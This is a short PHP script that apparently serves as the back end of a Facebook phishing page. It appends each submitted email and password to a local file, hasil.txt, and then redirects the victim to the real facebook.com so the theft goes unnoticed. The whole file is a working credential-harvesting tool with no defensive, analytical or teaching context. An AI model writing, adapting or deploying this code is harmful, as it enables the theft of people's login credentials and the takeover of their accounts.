<?php
$file = "hasil.txt";
$a= fopen($file, 'a+') or die("can't open file");
$text = "$_POST[email] -> $_POST[pass]\r\n";
$write=fwrite($a, $text);
fclose($a);

echo"<script language=javascript>window.location='http://www.facebook.com'</script>";

?>
